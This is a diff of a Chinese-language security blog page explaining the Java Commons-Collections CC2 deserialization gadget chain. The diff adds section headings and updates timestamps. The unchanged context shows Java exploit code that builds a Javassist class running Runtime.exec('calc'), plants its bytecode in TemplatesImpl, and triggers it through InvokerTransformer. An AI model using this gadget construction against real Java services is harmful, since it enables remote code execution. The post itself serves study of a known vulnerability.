@@ -140,7 +140,7 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://nbwsws.github.io/images/redefine-og.webp">
 <meta property="article:published_time" content="2025-08-15T00:49:48.037Z">
-<meta property="article:modified_time" content="2025-08-16T10:14:48.876Z">
+<meta property="article:modified_time" content="2025-08-16T10:17:10.104Z">
 <meta property="article:author" content="uwi">
 <meta property="article:tag" content="java">
 <meta name="twitter:card" content="summary">
@@ -373,8 +373,8 @@
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2025-08-16 18:14:48</span>
-            <span class="mobile">2025-08-16 18:14:48</span>
+            <span class="desktop">2025-08-16 18:17:10</span>
+            <span class="mobile">2025-08-16 18:17:10</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -544,7 +544,7 @@
                       alt="image-20250816172947683"
                 ></p>
 <p>成功调用计算器</p>
-<p>那么我们就要找找在哪里会调用newTransformer这个方法</p>
+<h2 id="引入InvokerTransformer"><a href="#引入InvokerTransformer" class="headerlink" title="引入InvokerTransformer"></a>引入InvokerTransformer</h2><p>那么我们就要找找在哪里会调用newTransformer这个方法</p>
 <p>我们自然而然可以想到InvokerTransformer来调用</p>
 <div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        CtClass ctClass = pool.makeClass(&quot;hacker&quot;);</span><br><span class="line">        CtConstructor noArgConstructor = new CtConstructor(new CtClass[0], ctClass);</span><br><span class="line">        noArgConstructor.setBody(&quot;&#123;Runtime.getRuntime().exec(\&quot;calc\&quot;);&#125;&quot;);</span><br><span class="line">        ctClass.addConstructor(noArgConstructor);</span><br><span class="line"></span><br><span class="line">        //满足条件3</span><br><span class="line">        CtClass ancestor = pool.get(&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;);</span><br><span class="line">        ctClass.setSuperclass(ancestor);</span><br><span class="line"></span><br><span class="line">        byte[] bytecode = ctClass.toBytecode();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        //满足条件1</span><br><span class="line">        Class&lt;? extends  TemplatesImpl&gt; clazz = TemplatesImpl.class;</span><br><span class="line">        TemplatesImpl ob = clazz.newInstance();</span><br><span class="line">        Field _name = clazz.getDeclaredField(&quot;_name&quot;);</span><br><span class="line">        _name.setAccessible(true);</span><br><span class="line">        _name.set(ob, &quot;test&quot;);</span><br><span class="line">        //满足条件2</span><br><span class="line">        Field _bytecodes = clazz.getDeclaredField(&quot;_bytecodes&quot;);</span><br><span class="line">        _bytecodes.setAccessible(true);</span><br><span class="line">        _bytecodes.set(ob, new byte[][]&#123;bytecode&#125;);  // 必须是二维数组</span><br><span class="line"></span><br><span class="line">        //满足条件4</span><br><span class="line">        TransformerFactoryImpl transformerFactory = new TransformerFactoryImpl();</span><br><span class="line">        Field _tfactory = clazz.getDeclaredField(&quot;_tfactory&quot;);</span><br><span class="line">        _tfactory.setAccessible(true);</span><br><span class="line">        _tfactory.set(ob, transformerFactory);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;newTransformer&quot;, new Class[0], new Object[0]);</span><br><span class="line">        invokerTransformer.transform(ob);</span><br></pre></td></tr></table></figure></div>
 
@@ -578,7 +578,7 @@
                      data-src="/../../images/image-20250816174610775.png"
                       alt="image-20250816174610775"
                 ></p>
-<p>找找哪里调用了compare方法</p>
+<h2 id="利用PriorityQueue-的readobject"><a href="#利用PriorityQueue-的readobject" class="headerlink" title="利用PriorityQueue 的readobject"></a>利用PriorityQueue 的readobject</h2><p>找找哪里调用了compare方法</p>
 <p>在PriorityQueue 类中就有调用compare的方法</p>
 <p>我们看看他的readobject方法 调用了heapify </p>
 <p><img  
@@ -629,7 +629,7 @@
         
             <li>
                 <strong>Updated at
-                    :</strong> 2025-08-16 18:14:48
+                    :</strong> 2025-08-16 18:17:10
             </li>
         
         <li>
@@ -733,7 +733,7 @@
 	<div class="post-toc">
 		<div class="toc-title">On this page</div>
 		<div class="page-title">cc2链调用</div>
-		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%9C%80%E8%A6%81%E5%BC%95%E5%85%A5"><span class="nav-text">需要引入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8A%A8%E6%80%81%E5%88%9B%E5%BB%BA%E7%B1%BB"><span class="nav-text">动态创建类</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%A1%E4%BB%B61"><span class="nav-text">条件1.</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%A1%E4%BB%B62%EF%BC%9A"><span class="nav-text">条件2：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%A1%E4%BB%B63%EF%BC%9A"><span class="nav-text">条件3：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%A1%E4%BB%B64%EF%BC%9A"><span class="nav-text">条件4：</span></a></li></ol></li></ol>
+		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%9C%80%E8%A6%81%E5%BC%95%E5%85%A5"><span class="nav-text">需要引入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8A%A8%E6%80%81%E5%88%9B%E5%BB%BA%E7%B1%BB"><span class="nav-text">动态创建类</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%A1%E4%BB%B61"><span class="nav-text">条件1.</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%A1%E4%BB%B62%EF%BC%9A"><span class="nav-text">条件2：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%A1%E4%BB%B63%EF%BC%9A"><span class="nav-text">条件3：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%A1%E4%BB%B64%EF%BC%9A"><span class="nav-text">条件4：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BC%95%E5%85%A5InvokerTransformer"><span class="nav-text">引入InvokerTransformer</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8PriorityQueue-%E7%9A%84readobject"><span class="nav-text">利用PriorityQueue 的readobject</span></a></li></ol></li></ol>
 
 	</div>
 </div>
